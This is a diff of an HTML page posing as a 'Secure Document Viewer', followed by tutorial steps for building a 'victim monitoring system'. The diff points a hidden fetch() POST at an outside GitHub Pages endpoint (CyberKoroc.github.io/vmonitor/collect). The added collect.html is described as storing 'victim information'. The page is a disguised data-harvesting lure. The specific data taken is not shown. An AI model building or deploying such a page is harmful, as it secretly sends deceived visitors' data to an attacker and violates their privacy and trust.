@@ -4,13 +4,26 @@
     <title>Secure Document Viewer</title>
     <style>
         body { font-family: Arial, sans-serif; text-align: center; margin-top: 50px; background: #f5f5f5; }
-        .container { max-width: 500px; margin: 0 auto; padding: 20px; background: white; border-radius: 10px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
-        button { padding: 15px 30px; font-size: 16px; margin: 10px; background: #4CAF50; color: white; border: none; border-radius: 5px; cursor: pointer; }
+        .container { max-width: 500px; margin: 0 auto; padding: 20px; background: white; border-radius: 10px; box-shadow:
+0 2px 10px rgba(0,0,0,0.1); }
+        h1 { color: #333; }
+        p { color: #666; }
+        button {
+            padding: 12px 24px;
+            font-size: 16px;
+            margin: 10px;
+            background: #4CAF50;
+            color: white;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            transition: background 0.3s;
+        }
         button:hover { background: #45a049; }
-        .status { padding: 10px; margin: 10px; border-radius: 5px; }
-        .success { background: #d4edda; color: #155724; }
-        .error { background: #f8d7da; color: #721c24; }
-        .info { background: #d1ecf1; color: #0c5460; }
+        .status { padding: 15px; margin: 15px 0; border-radius: 5px; }
+        .success { background: #d4edda; color: #155724; border: 1px solid #c3e6cb; }
+        .error { background: #f8d7da; color: #721c24; border: 1px solid #f5c6cb; }
+        .info { background: #d1ecf1; color: #0c5460; border: 1px solid #bee5eb; }
     </style>
 </head>
 <body>
@@ -70,7 +83,7 @@
                 };
 
                 // Send to your GitHub Pages site
-                const response = await fetch('https://yourusername.github.io/victim-monitor/collect', {
+                const response = await fetch('https://CyberKoroc.github.io/vmonitor/collect', {
                     method: 'POST',
                     headers: {
                         'Content-Type': 'application/json',
@@ -124,5 +137,22 @@
             }
         });
     </script>
+</body>
+</html>
+```
+
+### Step 3: Create a simple collect.html file
+Create a new file called `collect.html` with this content:
+
+```html
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Collect Data</title>
+</head>
+<body>
+    <h1>Collect Data Endpoint</h1>
+    <p>This is the data collection endpoint for your victim monitoring system.</p>
+    <p>POST data to this endpoint to store victim information.</p>
 </body>
 </html>
